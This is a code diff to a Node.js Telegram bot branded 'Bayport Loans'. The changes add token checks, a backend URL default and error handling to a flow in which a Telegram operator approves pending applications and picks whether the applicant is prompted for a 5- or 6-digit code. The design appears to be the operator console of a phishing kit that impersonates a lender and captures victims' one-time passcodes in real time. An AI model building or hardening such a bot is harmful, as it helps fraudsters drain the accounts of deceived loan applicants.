@@ -5,11 +5,17 @@ const axios = require('axios');
 dotenv.config();
 
 const token = process.env.BOT_TOKEN;
-const backendUrl = process.env.BACKEND_URL;
+const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
+
+if (!token) {
+    console.error('❌ BOT_TOKEN not found in environment variables');
+    process.exit(1);
+}
 
 const bot = new TelegramBot(token, { polling: true });
 
 console.log('🤖 Bayport Loans Telegram Bot Started');
+console.log(`📡 Backend URL: ${backendUrl}`);
 
 // Store pending approvals
 const pendingApps = new Map();
@@ -98,17 +104,31 @@ bot.on('callback_query', async (callbackQuery) => {
     if (action === 'code5') codeLength = '5-digit';
     if (action === 'code6') codeLength = '6-digit';
     
-    // Notify backend
-    await axios.post(`${backendUrl}/api/approve`, {
-        referenceId: refId,
-        action: 'approved',
-        codeLength: codeLength
-    });
-    
-    bot.sendMessage(msg.chat.id, 
-        `✅ *${codeLength} code selected*\n\nReference: ${refId}\n\nThe user will now be prompted for a ${codeLength} code.`,
-        { parse_mode: 'Markdown' }
-    );
+    try {
+        // Notify backend
+        await axios.post(`${backendUrl}/api/approve`, {
+            referenceId: refId,
+            action: 'approved',
+            codeLength: codeLength
+        });
+        
+        bot.sendMessage(msg.chat.id, 
+            `✅ *${codeLength} code selected*\n\nReference: ${refId}\n\nThe user will now be prompted for a ${codeLength} code.`,
+            { parse_mode: 'Markdown' }
+        );
+    } catch (error) {
+        bot.sendMessage(msg.chat.id, 
+            `❌ Error: Could not notify backend. ${error.message}`,
+            { parse_mode: 'Markdown' }
+        );
+    }
     
     bot.answerCallbackQuery(callbackQuery.id);
 });
+
+// Error handling
+bot.on('polling_error', (error) => {
+    console.error('Polling error:', error);
+});
+
+console.log('✅ Bot is running and waiting for commands...');
